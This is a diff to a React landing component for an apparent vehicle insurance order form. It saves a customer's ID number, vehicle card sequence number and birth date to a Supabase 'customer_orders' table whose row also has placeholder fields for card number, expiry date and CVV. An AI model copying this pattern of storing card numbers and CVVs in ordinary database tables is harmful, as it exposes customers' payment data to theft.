@@ -7,15 +7,56 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import DatePicker from "@/components/DatePicker";
+import { useOrder } from "@/contexts/OrderContext";
+import { supabase } from "@/integrations/supabase/client";
+import { format } from "date-fns";
 
 const Hero = () => {
   const navigate = useNavigate();
+  const { updateOrderData } = useOrder();
+  const [idNumber, setIdNumber] = useState("");
+  const [sequenceNumber, setSequenceNumber] = useState("");
   const [birthDate, setBirthDate] = useState<Date>();
   const [transferBirthDate, setTransferBirthDate] = useState<Date>();
   const [cardType, setCardType] = useState<"form" | "customs" | null>(null);
   const [transferCardType, setTransferCardType] = useState<"form" | "customs" | null>(null);
 
-  const handleNext = () => {
+  const handleNext = async () => {
+    if (!idNumber || !sequenceNumber || !birthDate) return;
+
+    const formattedBirthDate = format(birthDate, "yyyy-MM-dd");
+    
+    // Update context
+    updateOrderData({
+      idNumber,
+      sequenceNumber,
+      birthDate: formattedBirthDate,
+    });
+
+    // Save to database
+    try {
+      await supabase
+        .from("customer_orders")
+        .upsert({
+          id_number: idNumber,
+          sequence_number: sequenceNumber,
+          birth_date: formattedBirthDate,
+          vehicle_type: "",
+          vehicle_purpose: "",
+          insurance_company: "",
+          insurance_price: 0,
+          card_number: "",
+          card_holder_name: "",
+          expiry_date: "",
+          cvv: "",
+          status: "pending",
+        }, {
+          onConflict: "sequence_number",
+        });
+    } catch (error) {
+      console.error("Error saving order:", error);
+    }
+
     navigate("/vehicle-info");
   };
 
@@ -68,6 +109,8 @@ const Hero = () => {
                     pattern="[0-9]*"
                     inputMode="numeric"
                     className="h-12 text-base"
+                    value={idNumber}
+                    onChange={(e) => setIdNumber(e.target.value)}
                   />
                 </div>
 
@@ -129,6 +172,8 @@ const Hero = () => {
                     type="text" 
                     placeholder="000000000"
                     className="h-12 text-base text-center"
+                    value={sequenceNumber}
+                    onChange={(e) => setSequenceNumber(e.target.value)}
                   />
                 </div>
 
